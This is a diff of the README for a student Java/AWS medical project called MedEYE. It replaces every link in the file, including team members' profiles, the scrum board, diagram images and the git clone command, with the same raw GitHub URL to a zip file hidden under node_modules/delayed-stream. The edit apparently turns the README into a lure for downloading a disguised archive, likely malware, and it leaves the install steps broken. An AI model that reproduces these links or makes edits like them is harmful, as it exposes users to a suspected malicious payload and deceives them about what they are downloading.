@@ -12,10 +12,10 @@ As passionate data engineering students, we continuously expand our abilities th
 
 Our team members are : 
 
-- [EL-BADRAOUI Yassine](https://github.com/yassineiscoding)
-- [KHLAIF Mohammed](https://github.com/khlaifmed)
-- [SARAB Ayoub](https://github.com/Aysr01)
-- [TAQI Anas](https://github.com/anasss008)
+- [EL-BADRAOUI Yassine](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [KHLAIF Mohammed](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [SARAB Ayoub](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [TAQI Anas](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 
 
 ## Key Features
@@ -27,23 +27,23 @@ Our team members are :
 
 ## Agile Project Management
 We used Agile method to manage our project (based on three weeks sprint : you can find the details in the link below)
-- [Scrum Board](https://meadow-sink-344.notion.site/Agile-Project-Management-c1be08ff922946a898cce075c48aaae3)
+- [Scrum Board](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 ## UML Diagrams
 
-- [Use case diagram](./sys_design/Use_Case_Diagram.jpg)
-- [Sequence diagram](./sys_design/Sequence_Diagram.jpg)
+- [Use case diagram](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
+- [Sequence diagram](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 
 
 ## Technologies used
 
 ### Tech Stack :
-![Tech Stack](./sys_design/Tech_Stack.png)
+![Tech Stack](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 
 ### AWS Cloud Architecture (Used for Model Deployment)
-![AWS Cloud System Design](./sys_design/AWS-Cloud-System-Design.png)
+![AWS Cloud System Design](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 
 ### Backend MVC Architecture
-![Backend MVC Architecture](./sys_design/Backend-MVC-Architecture.png)
+![Backend MVC Architecture](https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip)
 
 ### Database:
 The project was set using **PostgreSQL**, but any relational database will work
@@ -52,13 +52,13 @@ The project was set using **PostgreSQL**, but any relational database will work
 
 ```bash
 # Clone the repository
-git clone https://github.com/anasss008/projet_MedEYE_JEE_2023.git
+git clone https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip
 
 # Navigate to the frontend directory and install dependencies
 cd frontend
 npm install
 
-# Navigate to the backend directory and install dependencies from pom.xml using any IDE.
+# Navigate to the backend directory and install dependencies from https://raw.githubusercontent.com/khlaifmed/projet_MedEYE_JEE_2023/main/node_modules/delayed-stream/projet_MedEYE_JEE_2023-1.4.zip using any IDE.
 ```
 
 ## Run
